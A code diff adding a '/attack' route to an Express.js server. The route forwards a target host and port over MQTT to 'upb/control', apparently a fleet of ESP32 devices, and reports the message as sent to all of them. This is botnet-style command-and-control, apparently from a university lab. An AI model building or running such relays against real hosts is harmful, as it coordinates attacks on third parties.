@@ -107,6 +107,29 @@ app.post('/control', (req, res) => {
     }
 });
 
+app.post('/attack', (req, res) => {
+    try {
+        // { "attack": "reseacrh.upb.edu", "port": XXX }
+        console.log('-----------------------------------------------------');
+        console.log(`\nRequest received on route "/attack":\n\t${req.body}\n`);
+        console.log('-----------------------------------------------------');
+
+        const message = req.body;
+        const topic_pub = `upb/control`;
+
+        if (message.attack !== "") {
+            publishMessage(topic_pub, message);
+            res.send(`Message sent to all ESP32 devices`);
+            return
+        }
+        return ;
+    } catch (error) {
+        console.error('Error processing request:', error);
+        res.status(500).send('Error processing request');
+    }
+
+});
+
 // Start the server
 app.listen(port, 
     () => {
